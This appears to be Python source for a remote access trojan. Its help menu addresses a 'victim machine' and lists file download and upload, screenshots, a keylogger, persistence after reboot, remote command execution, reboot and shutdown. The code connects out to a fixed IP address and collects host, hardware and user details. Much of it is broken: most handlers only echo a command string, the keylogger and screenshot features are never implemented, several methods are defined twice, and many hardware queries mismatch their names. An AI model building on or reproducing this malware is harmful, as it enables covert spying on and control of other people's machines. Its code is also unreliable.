import socket
import subprocess
import os
import sys
import platform
import time
import threading
import shutil
from PIL import ImageGrab
from mss import mss

class Client:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def connect(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.s.connect((self.ip, self.port))
            return True
        except Exception as e:
            print(e)
            return False

    def send(self, data):
        try:
            self.s.send(data)
        except Exception as e:
            print(e)

    def recv(self):
        try:
            return self.s.recv(1024)
        except Exception as e:
            print(e)

    def close(self):
        self.s.close()

    def get_os(self):

        if platform.system() == 'Windows':

            return 'Windows'

        elif platform.system() == 'Linux':

            return 'Linux'

    def get_platform(self):

        if platform.machine().endswith('64'):

            return 'x64'

        else:

            return 'x86'

    def get_username(self):

        if self.get_os() == 'Windows':

            return os.getenv('USERNAME')

        elif self.get_os() == 'Linux':

            return os.getenv('USER')

    def get_path(self):

        if self.get_os() == 'Windows':

            return os.getenv('HOMEPATH')

        elif self.get_os() == 'Linux':

            return os.getenv('HOME')

    def get_desktop(self):

        if self.get_os() == 'Windows':

            return os.path.join(os.getenv('HOMEPATH'), 'Desktop')

        elif self.get_os() == 'Linux':

            return os.path.join(os.getenv('HOME'), 'Desktop')

    def get_documents(self):

        if self.get_os() == 'Windows':

            return os.path.join(os.getenv('HOMEPATH'), 'Documents')

        elif self.get_os() == 'Linux':

            return os.path.join(os.getenv('HOME'), 'Documents')

    def get_downloads(self):

        if self.get_os() == 'Windows':

            return os.path.join(os.getenv('HOMEPATH'), 'Downloads')

        elif self.get_os() == 'Linux':

            return os.path.join(os.getenv('HOME'), 'Downloads')

    def get_current_dir(self):

        return os.getcwd()

    def get_current_user(self):

        return os.getlogin()

    def get_system(self):

        return platform.system()

    def get_processor(self):

        return platform.processor()

    def get_architecture(self):

        return platform.architecture()[0]

    def get_motherboard(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic baseboard get product', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('dmidecode -s baseboard-product-name', shell=True).decode().split('\n')[0]

    def get_gpu(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_bios(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic bios get name', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('dmidecode -s bios-version', shell=True).decode().split('\n')[0]

    def get_mac(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('getmac /NH', shell=True).decode().split('\n')[1].split(' ')[-1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('cat /sys/class/net/*/address', shell=True).decode().split('\n')[0]

    def get_ip(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('ipconfig | findstr IPv4', shell=True).decode().split('\n')[0].split(': ')[-1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('hostname -I', shell=True).decode().split('\n')[0]

    def get_cpu_temp(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_thermalzonecontroller get temperature', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('sensors | grep "Physical id 0"', shell=True).decode().split('\n')[0].split('+')[1]

    def get_gpu_temp(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get CurrentClockFrequency', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('sensors | grep "temp1"', shell=True).decode().split('\n')[0].split('+')[1]

    def get_ram(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic ComputerSystem get TotalPhysicalMemory', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('free -m | grep Mem', shell=True).decode().split('\n')[0].split(' ')[-2]

    def get_disk(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic LogicalDisk where DriveType="3" get FreeSpace', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('df -h | grep "/dev/sda"', shell=True).decode().split('\n')[0].split(' ')[-2]

    def get_gpu_name(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_driver(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get driverversion', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-2]

    def get_gpu_ram(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get CurrentClockFrequency', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_vram(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get CurrentClockFrequency', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_driver_version(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get DriverVersion', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-2]

    def get_gpu_driver_date(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get DriverDate', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-2]

    def get_gpu_vram(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get VideoMemoryType', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_vram_type(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get VideoMemoryType', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_vram_total(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get VideoMemoryType', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_vram_used(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get VideoMemoryType', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_vram_free(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get VideoMemoryType', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]

    def get_gpu_ram(self):

        if self.get_os() == 'Windows':

            return subprocess.check_output('wmic path win32_VideoController get VideoMemoryType', shell=True).decode().split('\n')[1]

        elif self.get_os() == 'Linux':

            return subprocess.check_output('lspci | grep VGA', shell=True).decode().split('\n')[0].split(' ')[-1]







class Server:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def connect(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.s.bind((self.ip, self.port))
            self.s.listen(1)
            return True
        except Exception as e:
            print(e)
            return False

    def accept(self):
        try:
            self.client, self.address = self.s.accept()
            return True
        except Exception as e:
            print(e)
            return False

    def recv(self):
        try:
            return self.client.recv(1024).decode()
        except Exception as e:
            print(e)

    def send(self, data):
        try:
            self.client.send(data)
        except Exception as e:
            print(e)

    def close(self):
        try:
            self.client.close()
        except Exception as e:
            print(e)

    def get_os(self):

        if platform.system() == 'Windows':

            return 'Windows'

        elif platform.system() == 'Linux':

            return 'Linux'


class Main:

    def __init__(self):

        self.client = Client('192.168.1.3', 8080)
        self.server = Server('0.0.0.0', 8080)

        self.server_thread = threading.Thread(target=self.server_loop)
        self.server_thread.daemon = True
        self.server_thread.start()

        self.client_thread = threading.Thread(target=self.client_loop)
        self.client_thread.daemon = True
        self.client_thread.start()

    def server_loop(self):

        while True:

            if not self.server.connect():

                time.sleep(5)

            else:

                if not self.server.accept():

                    time.sleep(5)

                else:

                    break

        while True:

            data = self.server.recv()

            if data == 'quit':

                break

            elif data == 'help':

                self.help()

            elif data == 'info':

                self.info()

            elif data == 'download':

                self.download()

            elif data == 'upload':

                self.upload()

            elif data == 'screenshot':

                self.screenshot()

            elif data == 'keylogger':

                self.keylogger()

            elif data == 'persistence':

                self.persistence()

            elif data == 'execute':

                self.execute()

            elif data == 'stop':

                self.stop()

            elif data == 'start':

                self.start()

            elif data == 'remove':

                self.remove()

            elif data == 'reboot':

                self.reboot()

            elif data == 'shutdown':

                self.shutdown()

            else:
                
                self.execute_command(data)
    
    def client_loop(self):

        while True:

            if not self.client.connect():

                time.sleep(5)

            else:

                break
        
        while True:
            
            if not self.client.send('ping'):
                
                time.sleep(5)
            
            else:
                
                break
    
    def help(self):

        print('\n')
        print('Available commands:')
        print('\n')
        print('help - Prints this help menu')
        print('info - Prints information about the victim machine')
        print('download - Downloads a file from the victim machine')
        print('upload - Uploads a file to the victim machine')
        print('screenshot - Takes a screenshot of the victim machine')
        print('keylogger - Starts/stops keylogger on the victim machine')
        print('persistence - Makes the client start up again after reboot')
        print('execute - Executes a file on the victim machine')
        print('stop - Stops keylogger on the victim machine')
        print('start - Starts keylogger on the victim machine')
        print('remove - Removes persistence from the client')
        print('reboot - Reboots the victim machine')
        print('shutdown - Shuts down the victim machine')
        print('\n')

    def info(self):

        self.client.send('info')

    def download(self):

        self.client.send('download')

    def upload(self):

        self.client.send('upload')

    def screenshot(self):

        self.client.send('screenshot')

    def keylogger(self):

        self.client.send('keylogger')

    def persistence(self):

        self.client.send('persistence')

    def execute(self):

        self.client.send('execute')

    def stop(self):

        self.client.send('stop')

    def start(self):

        self.client.send('start')

    def remove(self):

        self.client.send('remove')

    def reboot(self):

        self.client.send('reboot')

    def shutdown(self):

        self.client.send('shutdown')

    def execute_command(self, command):

        self.client.send(command)

if __name__ == '__main__':
    
    Main()